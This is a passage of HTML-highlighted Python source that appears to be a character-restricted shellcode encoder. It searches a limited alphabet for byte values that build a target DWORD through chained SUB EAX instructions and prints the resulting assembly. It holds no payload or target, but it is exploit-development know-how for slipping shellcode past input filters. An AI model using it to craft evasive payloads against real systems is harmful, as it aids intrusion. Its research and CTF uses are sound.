/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;k&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">range</span>(chrs_len):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;m&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">range</span>(chrs_len):<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;We&nbsp;get&nbsp;random&nbsp;byte&nbsp;from&nbsp;valid&nbsp;chars&nbsp;charset&nbsp;at&nbsp;currently&nbsp;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;processed&nbsp;positions.</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x1&nbsp;=&nbsp;alphabet[p[i]&nbsp;-&nbsp;<span style="color:#ff0044;font-weight:400">1</span>]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x2&nbsp;=&nbsp;alphabet[q[j]&nbsp;-&nbsp;<span style="color:#ff0044;font-weight:400">1</span>]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x3&nbsp;=&nbsp;alphabet[r[k]&nbsp;-&nbsp;<span style="color:#ff0044;font-weight:400">1</span>]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x4&nbsp;=&nbsp;alphabet[s[m]&nbsp;-&nbsp;<span style="color:#ff0044;font-weight:400">1</span>]<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;t[z]&nbsp;-&nbsp;Desired[z],&nbsp;the&nbsp;target&nbsp;byte&nbsp;we&nbsp;are&nbsp;looking&nbsp;for</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;l[z]&nbsp;-&nbsp;Previous[z],&nbsp;the&nbsp;previous&nbsp;byte&nbsp;on&nbsp;this&nbsp;position.</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Desired[z]&nbsp;=&nbsp;Previous[z]&nbsp;-&nbsp;Carry&nbsp;-&nbsp;A[z]&nbsp;-&nbsp;B[z]&nbsp;-&nbsp;C[z]&nbsp;-&nbsp;D[z]</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Previous[z]&nbsp;=&nbsp;Desired[z]&nbsp;+&nbsp;Carry&nbsp;+&nbsp;A[z]&nbsp;+&nbsp;B[z]&nbsp;+&nbsp;C[z]&nbsp;+&nbsp;D[z]</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tr&nbsp;=&nbsp;ctypes.c_uint32(&nbsp;t[z]&nbsp;+&nbsp;carry&nbsp;\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+&nbsp;<span style="color:#ff9d00;font-weight:700">ord</span>(x1)&nbsp;+&nbsp;<span style="color:#ff9d00;font-weight:700">ord</span>(x2)&nbsp;\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+&nbsp;<span style="color:#ff9d00;font-weight:700">ord</span>(x3)&nbsp;+&nbsp;<span style="color:#ff9d00;font-weight:700">ord</span>(x4)).value<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;If&nbsp;sum&nbsp;result&nbsp;equals&nbsp;to&nbsp;our&nbsp;previous&nbsp;byte&nbsp;at&nbsp;this&nbsp;position&nbsp;-</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;we&nbsp;have&nbsp;a&nbsp;hit.</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(tr&nbsp;&amp;&nbsp;<span style="color:#ff0044;font-weight:400">0xff</span>)&nbsp;==&nbsp;l[z]:<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Resulted&nbsp;value,&nbsp;in&nbsp;`tr`&nbsp;might&nbsp;be&nbsp;easily&nbsp;something&nbsp;like:&nbsp;0x175</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;then&nbsp;the&nbsp;carry&nbsp;will&nbsp;be&nbsp;0x01</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;carry&nbsp;=&nbsp;(tr&nbsp;&amp;&nbsp;<span style="color:#ff0044;font-weight:400">0xff00</span>)&nbsp;&gt;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">8</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;We&nbsp;hit&nbsp;bytes&nbsp;forming&nbsp;a&nbsp;good&nbsp;looking&nbsp;DWORD&nbsp;(32&nbsp;bit&nbsp;value),&nbsp;therefore</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;we&nbsp;store&nbsp;that&nbsp;value&nbsp;for&nbsp;later&nbsp;considerations</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;i&nbsp;&lt;&nbsp;chrs_len:&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pr[&nbsp;<span style="color:#ff0044;font-weight:400">1</span>&nbsp;+&nbsp;z]&nbsp;=&nbsp;x1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;coeffs[<span style="color:#ff0044;font-weight:400">0</span>][z]&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">ord</span>(x1)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;j&nbsp;&lt;&nbsp;chrs_len:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pr[&nbsp;<span style="color:#ff0044;font-weight:400">6</span>&nbsp;+&nbsp;z]&nbsp;=&nbsp;x2<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;coeffs[<span style="color:#ff0044;font-weight:400">1</span>][z]&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">ord</span>(x2)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;k&nbsp;&lt;&nbsp;chrs_len:&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pr[<span style="color:#ff0044;font-weight:400">11</span>&nbsp;+&nbsp;z]&nbsp;=&nbsp;x3<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;coeffs[<span style="color:#ff0044;font-weight:400">2</span>][z]&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">ord</span>(x3)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;m&nbsp;&lt;&nbsp;chrs_len:&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pr[<span style="color:#ff0044;font-weight:400">16</span>&nbsp;+&nbsp;z]&nbsp;=&nbsp;x4<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;coeffs[<span style="color:#ff0044;font-weight:400">3</span>][z]&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">ord</span>(x4)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dbg(<span style="color:#3ad900;font-weight:400">'try&nbsp;=&nbsp;%x,&nbsp;l[%d]&nbsp;=&nbsp;%x,&nbsp;t[%d]&nbsp;=&nbsp;%x,&nbsp;coeffs&nbsp;=&nbsp;%s'</span>&nbsp;%&nbsp;\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(tr,&nbsp;z,&nbsp;l[z],&nbsp;z,&nbsp;t[z],&nbsp;<span style="color:#ff9d00;font-weight:700">str</span>(coeffs)))<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;loop_next&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;We&nbsp;mark&nbsp;that&nbsp;we&nbsp;have&nbsp;already&nbsp;found&nbsp;a&nbsp;good&nbsp;values&nbsp;for&nbsp;that&nbsp;`z`&nbsp;position.</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flag[z]&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;a&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">4</span>&nbsp;<span style="color:#ff9d00;font-weight:700">or</span>&nbsp;loop_next:&nbsp;<span style="color:#ff9d00;font-weight:700">break</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;a&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">3</span>&nbsp;<span style="color:#ff9d00;font-weight:700">or</span>&nbsp;loop_next:&nbsp;<span style="color:#ff9d00;font-weight:700">break</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;a&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">2</span>&nbsp;<span style="color:#ff9d00;font-weight:700">or</span>&nbsp;loop_next:&nbsp;<span style="color:#ff9d00;font-weight:700">break</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Have&nbsp;we&nbsp;found&nbsp;already&nbsp;all&nbsp;4&nbsp;byte&nbsp;candidates?</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">sum</span>(flag)&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">4</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dbg(<span style="color:#3ad900;font-weight:400">'flag=%s,&nbsp;a=%d,&nbsp;z=%d,&nbsp;i=%d,&nbsp;j=%d,&nbsp;k=%d,&nbsp;m=%d'</span>&nbsp;%&nbsp;(flag,a,z,i,j,k,m))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">break</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">assert</span>&nbsp;<span style="color:#ff9d00;font-weight:700">sum</span>(flag)&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">4</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"Could&nbsp;not&nbsp;generate&nbsp;computation&nbsp;instructions&nbsp;for&nbsp;this&nbsp;dword:&nbsp;0x%08x"</span>&nbsp;%&nbsp;dword<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;dbg(<span style="color:#3ad900;font-weight:400">'Coeffs&nbsp;before&nbsp;fixups&nbsp;=&nbsp;%s'</span>&nbsp;%&nbsp;(<span style="color:#ff9d00;font-weight:700">str</span>(coeffs)))<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Now&nbsp;we&nbsp;need&nbsp;to&nbsp;check&nbsp;whether&nbsp;the&nbsp;above&nbsp;algorithm&nbsp;did&nbsp;not&nbsp;fell&nbsp;into&nbsp;local&nbsp;optimum</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;and&nbsp;didn't&nbsp;yielded&nbsp;some&nbsp;slightly&nbsp;varying&nbsp;values.&nbsp;We&nbsp;will&nbsp;retry&nbsp;5&nbsp;times&nbsp;values&nbsp;fixups.</span><br />&nbsp;&nbsp;&nbsp;&nbsp;ctr&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">while</span>&nbsp;ctr&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">5</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ctr&nbsp;+=&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dbg(<span style="color:#3ad900;font-weight:400">'Fixup&nbsp;attempt&nbsp;%d:&nbsp;gen(0x%08x,&nbsp;0x%08x,&nbsp;...):&nbsp;"%s"'</span>&nbsp;%&nbsp;\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(ctr,&nbsp;dword,&nbsp;prev,&nbsp;<span style="color:#3ad900;font-weight:400">''</span>.join([<span style="color:#3ad900;font-weight:400">'%02x'</span>&nbsp;%&nbsp;<span style="color:#ff9d00;font-weight:700">ord</span>(c)&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;c&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;pr])))<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Now&nbsp;we&nbsp;print&nbsp;assembler&nbsp;interpretation&nbsp;of&nbsp;collected&nbsp;coefficients</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;val&nbsp;=&nbsp;prev<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dbg(<span style="color:#3ad900;font-weight:400">'\n\t\t\t\t;&nbsp;EAX&nbsp;=&nbsp;0x%08x'</span>&nbsp;%&nbsp;val,&nbsp;<span style="color:#ff0044;font-weight:400">True</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;n&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;coeffs:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;num&nbsp;=&nbsp;compose(n)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;val&nbsp;=&nbsp;ctypes.c_uint32(val&nbsp;-&nbsp;num).value<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dbg(<span style="color:#3ad900;font-weight:400">'\tSUB&nbsp;EAX,&nbsp;0x%08x\t;&nbsp;EAX&nbsp;=&nbsp;0x%08x'</span>&nbsp;%&nbsp;(num,&nbsp;val),&nbsp;<span style="color:#ff0044;font-weight:400">True</span>)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;oops,&nbsp;the&nbsp;resutled&nbsp;from&nbsp;substraction&nbsp;value&nbsp;is&nbsp;not&nbsp;matching&nbsp;desired&nbsp;one.</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;we&nbsp;will&nbsp;have&nbsp;to&nbsp;fixup&nbsp;bytes&nbsp;that&nbsp;differ&nbsp;and&nbsp;retry&nbsp;verification&nbsp;process.</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span 